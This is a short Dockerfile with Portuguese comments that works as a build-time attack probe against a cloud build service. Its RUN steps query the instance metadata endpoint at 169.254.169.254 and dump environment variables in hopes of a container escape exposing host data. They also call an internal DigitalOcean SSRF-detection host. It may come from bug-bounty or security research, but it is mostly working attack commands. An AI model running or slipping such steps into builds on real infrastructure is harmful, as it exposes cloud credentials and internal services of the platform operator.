FROM alpine:latest
# Tentativa de ler o Metadata Service e jogar na saída de erro/log
RUN apk add --no-cache curl
RUN curl -s http://169.254.169.254/metadata/v1.json || echo "IMDS Falhou"
# Tentativa de ler variáveis de ambiente do host (se houver escape)
RUN env
# Tentativa de bater no Sheriff
RUN curl -s https://ssrf-sheriff.internal.digitalocean.com/?nocturne21_build